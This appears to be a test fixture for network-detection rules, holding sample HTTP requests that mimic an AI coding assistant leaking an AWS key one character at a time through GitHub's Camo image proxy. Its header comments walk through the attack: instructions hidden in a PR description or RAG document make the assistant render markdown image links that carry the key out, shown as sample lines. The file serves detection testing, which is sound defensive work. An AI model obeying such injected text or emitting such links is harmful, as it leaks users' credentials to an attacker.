@@ -1,0 +1,48 @@
+# Test artifact for 05-copilot-assistant-abuse/ai_assistant_outbound_to_camo_proxy.rules
+# Should trigger SID 9000500 (sequential Camo image fetches) and SID 9000503
+# (burst of tiny image responses to AI assistant client).
+#
+# Each request below represents one character of an exfiltrated AWS access
+# key being smuggled out via the Camo image proxy. In a real attack the
+# attacker would inject hidden instructions into a PR description or RAG
+# document, causing GitHub Copilot Chat to render markdown like:
+#
+#   ![](https://camo.githubusercontent.com/AKIAI..../?d=A)
+#   ![](https://camo.githubusercontent.com/AKIAI..../?d=K)
+#   ...
+#
+# To replay: use `mitmproxy` or `httpie` in a loop; or write to text2pcap.
+# All requests use the same User-Agent identifying the GitHub Desktop client.
+
+GET /4f8b9d3c2a1e/?d=A HTTP/1.1
+Host: camo.githubusercontent.com
+User-Agent: GitHub-Copilot/1.243.0 (Electron)
+Accept: image/webp,*/*
+
+GET /4f8b9d3c2a1e/?d=K HTTP/1.1
+Host: camo.githubusercontent.com
+User-Agent: GitHub-Copilot/1.243.0 (Electron)
+Accept: image/webp,*/*
+
+GET /4f8b9d3c2a1e/?d=I HTTP/1.1
+Host: camo.githubusercontent.com
+User-Agent: GitHub-Copilot/1.243.0 (Electron)
+Accept: image/webp,*/*
+
+GET /4f8b9d3c2a1e/?d=A HTTP/1.1
+Host: camo.githubusercontent.com
+User-Agent: GitHub-Copilot/1.243.0 (Electron)
+Accept: image/webp,*/*
+
+GET /4f8b9d3c2a1e/?d=I HTTP/1.1
+Host: camo.githubusercontent.com
+User-Agent: GitHub-Copilot/1.243.0 (Electron)
+Accept: image/webp,*/*
+
+# ... 25+ more requests in the same 60-second window to trip the threshold ...
+
+# Server response side (each ~150 bytes — triggers SID 9000503):
+#   HTTP/1.1 200 OK
+#   Content-Type: image/png
+#   Content-Length: 95
+#   <1x1 transparent pixel binary>
